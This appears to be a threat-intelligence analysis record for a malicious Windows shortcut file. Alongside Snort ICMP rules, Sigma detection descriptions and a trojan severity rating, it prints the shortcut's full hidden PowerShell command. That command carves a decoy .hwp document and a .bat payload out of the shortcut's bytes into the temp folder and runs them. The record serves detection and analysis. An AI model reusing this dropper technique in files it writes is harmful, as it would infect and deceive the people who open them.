alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING Windows"; itype:8; content:"abcdefghijklmnop",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

lnk_info.command_line_arguments: /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x0001DB1D86} ^| Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00091558 -ReadCount 00091558; $pdfPath = '%temp%\230402.hwp'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; ^& $pdfPath; $exeFile = gc $lnkpath -Encoding Byte -TotalCount 00094808 -ReadCount 00094808; $exePath = '%temp%\230402.bat'; sc $exePath ([byte[]]($exeFile ^| select -Skip 00091558)) -Encoding Byte; ^& $exePath;

attributes.magic: MS Windows shortcut, Has Description string, Has command line arguments, Icon number=1, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hidenormalshowminimized

exiftool.Flags: Description, CommandArgs, IconFile, Unicode, ExpString, PreferEnvPath

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.
